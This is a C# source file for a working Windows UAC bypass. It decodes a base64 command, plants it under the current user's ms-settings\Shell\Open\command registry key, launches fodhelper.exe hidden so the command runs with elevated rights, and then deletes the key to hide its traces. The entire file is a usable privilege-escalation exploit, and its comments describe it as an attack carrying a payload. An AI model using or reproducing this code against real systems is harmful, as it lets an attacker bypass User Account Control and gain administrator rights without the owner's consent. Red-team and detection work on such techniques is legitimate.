using System;
using System.Threading;
using System.Diagnostics;
using System.Text;
using Microsoft.Win32;

namespace Fodhelper_uac_bypass
{
    class Program
    {
        static void Main(string[] args)
        {
            //Check for command to enter
            if (args.Length == 0)
            {
                System.Console.WriteLine("Please enter the command to run in an elevated context");
                System.Environment.Exit(1);
            }

            //Check if the UAC is set to "always notify." Exit if true as the attack will fail
            //Stolen from enigma0x3's eventvwr bypass powershell script
            RegistryKey alwaysNotify = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System");
            string consentPrompt = alwaysNotify.GetValue("ConsentPromptBehaviorAdmin").ToString();
            string secureDesktopPrompt = alwaysNotify.GetValue("PromptOnSecureDesktop").ToString();
            alwaysNotify.Close();

            if (consentPrompt == "2" & secureDesktopPrompt == "1")
            {
                System.Console.WriteLine("UAC is set to 'Always Notify.' This attack will fail. Exiting...");
                System.Environment.Exit(1);
            }

            byte[] encodedCommand = Convert.FromBase64String(args[0]);
            string command = Encoding.UTF8.GetString(encodedCommand);

            //Set the registry key for fodhelper
            RegistryKey newkey = Registry.CurrentUser.OpenSubKey(@"Software\Classes\", true);
            newkey.CreateSubKey(@"ms-settings\Shell\Open\command");
            
            RegistryKey fodhelper = Registry.CurrentUser.OpenSubKey(@"Software\Classes\ms-settings\Shell\Open\command",true);
            fodhelper.SetValue("DelegateExecute", "");
            fodhelper.SetValue("", @command);
            fodhelper.Close();

            //start fodhelper
            Process p = new Process();
            p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            p.StartInfo.FileName = "C:\\windows\\system32\\fodhelper.exe";
            p.Start();

            //sleep 10 seconds to let the payload execute
            Thread.Sleep(10000);

            //Unset the registry
            newkey.DeleteSubKeyTree("ms-settings");
        }
    }
}
